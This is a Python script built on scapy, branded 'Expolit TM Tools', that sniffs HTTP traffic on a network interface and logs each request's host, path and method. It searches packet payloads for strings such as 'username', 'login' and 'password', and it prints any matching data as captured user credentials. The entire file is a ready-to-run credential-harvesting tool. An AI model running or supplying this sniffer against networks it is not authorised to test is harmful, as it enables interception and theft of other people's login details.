import scapy.all as scapy
from scapy.layers import http
import optparse
def sniff(interface):
	scapy.sniff(iface=interface , store=False , prn=process_sniff_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
def get_method(packet):
    return packet[http.HTTPRequest].Method
    
def User_Info(packet):
	if packet.haslayer(scapy.Raw):
		load = str(packet[scapy.Raw].load)
		a = ["UserName","username","Username","USERNAME","user","login","password","pass"]
		for i in a :
			if  i in load:
				return load				

def process_sniff_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		method = get_method(packet)

		print(  "[+] request path :  "+str(url) + "\t[+] request Method :  "+str(method))
		user_info = User_Info(packet)
		if not user_info == None:
			print("==============================\n\n\n\n\n[!] user And Password : "+str(user_info)+"\n\n\n\n\n==============================")


def banner():
    print("""
    ___          
   |   |      
   |   |   
   |   |                      /\
   |   \___________/\  /\    /  \_____________________
   |   				 \/  \  /       [!] Expolit TM Tools -> sniff packet http (python3) v1.1
   |______________________\/_______________________| [ 2021 mey 28 ]
   example : python3 packetSpoofing.py -i eth0
          
""")
    
def main():
    
	parser = optparse.OptionParser()
	parser.add_option("-i","--interface",dest="interface",help="interface sniff")
	(options , arguments) = parser.parse_args()
	sniff(options.interface)
 
 
if __name__ == "__main__":
	banner()
	main()
